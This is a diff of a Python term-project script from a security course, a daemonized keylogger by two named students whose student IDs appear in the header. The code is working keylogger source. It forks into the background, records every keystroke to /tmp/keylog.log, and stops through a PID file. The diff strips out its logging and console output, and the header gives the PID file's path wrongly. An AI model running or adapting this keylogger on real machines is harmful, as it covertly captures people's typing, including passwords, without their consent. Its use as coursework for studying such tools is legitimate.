@@ -1,62 +1,60 @@
 #!/usr/bin/python3
 
-#==============================================================================
- #      Assignment: DPI912 Term Project
- #      Daemonized Key Logger
- #
- #      Authors: Sang Min Park, Jacky Tea
- #      Student ID (Sang Min Park): 124218173
- #      Student ID (Jacky Tea): 152078168
- #      Language: Python3
- #      Libraries Used: keyboard, pynput, sys, os, atexit, signal, logzero
- #
- #      To compile with python3 >>> python3 a1KeyLogger.py start
- #      To compile with executable >>> chmod 700 a1KeyLogger.py
- #                                 >>> ./a1KeyLogger.py start
- #
- #      Class: DPI912 NSB - Python for Programmers: Sockets and Security 
- #      Professor: Dr. Harvey Kaduri
- #      Due Date: Friday, December 6, 2019, 5:50 PM EST
- #      Submitted:  
- #
- #-----------------------------------------------------------------------------
- #
- #      Cookbook code utilized from the following source:
- #      https://github.com/dabeaz/python-cookbook/blob/master/src/12/launching_a_daemon_process_on_unix/daemon.py
- #
- #      Description: A keystroke logging program that records all keystrokes that
- #      a user inputs into their keyboard. This program runs in the background via forking.
- #
- #      Input: A command line argument of either 'start' or 'stop'. For example:
- #      ./a1KeyLogger.py start. 'start' will execute the key logger, 'stop' will 
- #      kill its background process.
- #
- #      Output: A file in /tmp called 'keylog.log', full path: '/tmp/keylog.log'.
- #      This file contains all keystrokes recorded up till the time the daemon is 
- #      terminated. Another file in the path: '/tmp/keylog.log' is generated to keep
- #      track of the daemon's PID value once it double forks from the terminal.
- #
- #      Algorithm: Performs a check to see if PID file exists, if it does, an error
- #      is thrown to indicate that a daemon instance is already running. If not, 
- #      the program forks off twice to separate itself as a background process
- #      away from the terminal and begins to detecting any keystrokes put into 
- #      the keyboard. All keystrokes are then logged to a log file until the 
- #      the machine is shut off, or a SIGHUP or a SIGTERM is detected to terminate 
- #      the daemon. 
- #
- #      Required Features Not Included:
- #
- #      Known Bugs: os.kill() can be disrupted at times, leaving the process running.
- #
-#==============================================================================
+# ==============================================================================
+#      Assignment: DPI912 Term Project
+#      Daemonized Key Logger
+#
+#      Authors: Sang Min Park, Jacky Tea
+#      Student ID (Sang Min Park): 124218173
+#      Student ID (Jacky Tea): 152078168
+#      Language: Python3
+#      Libraries Used: keyboard, pynput, sys, os, atexit, signal, logzero
+#
+#      To compile with python3 >>> python3 a1KeyLogger.py start
+#      To compile with executable >>> chmod 700 a1KeyLogger.py
+#                                 >>> ./a1KeyLogger.py start
+#
+#      Class: DPI912 NSB - Python for Programmers: Sockets and Security
+#      Professor: Dr. Harvey Kaduri
+#      Due Date: Friday, December 6, 2019, 5:50 PM EST
+#      Submitted:
+#
+# -----------------------------------------------------------------------------
+#
+#      Cookbook code utilized from the following source:
+#      https://github.com/dabeaz/python-cookbook/blob/master/src/12/launching_a_daemon_process_on_unix/daemon.py
+#
+#      Description: A keystroke logging program that records all keystrokes that
+#      a user inputs into their keyboard. This program runs in the background via forking.
+#
+#      Input: A command line argument of either 'start' or 'stop'. For example:
+#      ./a1KeyLogger.py start. 'start' will execute the key logger, 'stop' will
+#      kill its background process.
+#
+#      Output: A file in /tmp called 'keylog.log', full path: '/tmp/keylog.log'.
+#      This file contains all keystrokes recorded up till the time the daemon is
+#      terminated. Another file in the path: '/tmp/keylog.log' is generated to keep
+#      track of the daemon's PID value once it double forks from the terminal.
+#
+#      Algorithm: Performs a check to see if PID file exists, if it does, an error
+#      is thrown to indicate that a daemon instance is already running. If not,
+#      the program forks off twice to separate itself as a background process
+#      away from the terminal and begins to detecting any keystrokes put into
+#      the keyboard. All keystrokes are then logged to a log file until the
+#      the machine is shut off, or a SIGHUP or a SIGTERM is detected to terminate
+#      the daemon.
+#
+#      Required Features Not Included:
+#
+#      Known Bugs: os.kill() can be disrupted at times, leaving the process running.
+#
+# ==============================================================================
 
 from pynput import keyboard
 import sys
 import os
 import atexit
 import signal
-import logzero
-from logzero import logger
 
 pidFile = '/tmp/keylog.pid'
 
@@ -73,11 +71,6 @@ def processTerminator(signalNumber,  functionReference):
             return
 
 
-# Add logging to logfile and disable output to the terminal
-logzero.logfile("/home/lab/bin/py/project/k.log", maxBytes=1e6,
-                backupCount=3, disableStderrLogger=True)
-
-
 # Main
 if len(sys.argv) < 2:
     print('Incorrect Args! Usage: ./a1KeyLogger.py [start | stop]')
@@ -86,8 +79,6 @@ if len(sys.argv) < 2:
 # Detect start command
 if sys.argv[1] == 'start':
     try:
-        logger.info("Keylogger starting...")
-
         if os.path.exists(pidFile):
             raise RuntimeError()
 
@@ -124,38 +115,37 @@ if sys.argv[1] == 'start':
         except Exception as err:
             raise Exception()
 
+        # Keylogger function
         def keyPressed(key):
             if str(key) == 'Key.esc':
                 sys.exit(0)
             else:
+                # Write pressed keys into a log
                 with open('/tmp/keylog.log',  'a') as fileHandler:
                     fileHandler.write(str(key))
 
+        # Listening for keylogging activities
         with keyboard.Listener(on_press=keyPressed) as listener:
             listener.join()
 
     except RuntimeError as err:
-        print(err)
         raise SystemExit()
 
 
-# detect stop command and send signal to kill daemon
+# Detect stop command and send signal to kill daemon
 elif sys.argv[1] == 'stop':
+    # Kill pid process stored in the pidfile and SystemExit after
     if os.path.exists(pidFile):
         with open(pidFile) as fileHandler:
-            logger.info("Keylogger finishing...")
             pid = int(fileHandler.readline().rstrip())
-            print(pid)
             while True:
                 try:
                     os.kill(pid,  signal.SIGTERM)
                 except Exception as err:
                     raise SystemExit()
     else:
-        print('Key logger is not currently running!')
         raise SystemExit()
 
 # detect erroneous command
 else:
-    print('Unknown command:',  str(sys.argv[1]))
     raise SystemExit()
